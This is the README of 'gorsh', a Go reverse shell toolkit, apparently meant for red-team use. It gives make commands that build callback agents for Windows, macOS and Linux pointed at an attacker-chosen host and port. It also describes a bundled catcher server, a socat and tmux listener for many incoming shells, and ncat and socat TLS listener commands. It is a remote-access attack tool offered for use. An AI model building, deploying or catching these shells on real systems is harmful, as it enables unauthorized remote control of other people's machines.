# gorsh

[go]lang [r]everse [sh]ell

[![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/no-ragrets.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/contains-technical-debt.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-crayons.svg)](https://forthebadge.com)

![](https://i.imgur.com/x51XH6K.png)
[![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)



## Getting started
```bash
git clone git@github.com:audibleblink/gorsh.git
```

Using the zstd build tag and windll make target require cgo.
Make sure you're familiar with cross-compilation and cgo and have the toolchains for it, or read
[here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.

### Usage

Generate agents with:

```bash
# For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
$ make {windows,macos,linux} LHOST=example.com LPORT=443
```

#### Catching the shell

This project ships with a server that catches the reverse shell and still provides shell-like
capabilities you lose with traditional reverse shells, including:

* Tab Completion
* Vi-mode readline editing
* History
* Cursor movements

Generate the server with:

```sh
make server
build/srv/gorsh-server --help
```

The gorsh and gorsh-server have a one-to-one relationship, like a traditional shell. For multiple
shells, you need to start multiple servers on different ports. Unless...

To have the ability to receive multiple shells on the same port, there's the `make listen` target.
The `make listen` target kicks off a socat TLS pipe and creates new tmux windows with each new
incoming connection.  Feed it a port number as PORT. 
`socat` is essentially acting as a TLS-terminating reverse proxy. The incoming connections are then
handed off to gorsh-server through randomly generated Unix Domain Sockets.

```sh
make listen PORT=8080

# once a client connects, on a different terminal type:
tmux attach -t GORSH
```

Shells can also be caught without tmux or gorsh-server using:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

## Credits

* Initial Work - [@lesnuages](https://github.com/lesnuages)
* [@mzpqnxow](https://github.com/mzpqnxow) for figuring out my x-compilation and dependancy problems and troubleshooting guide
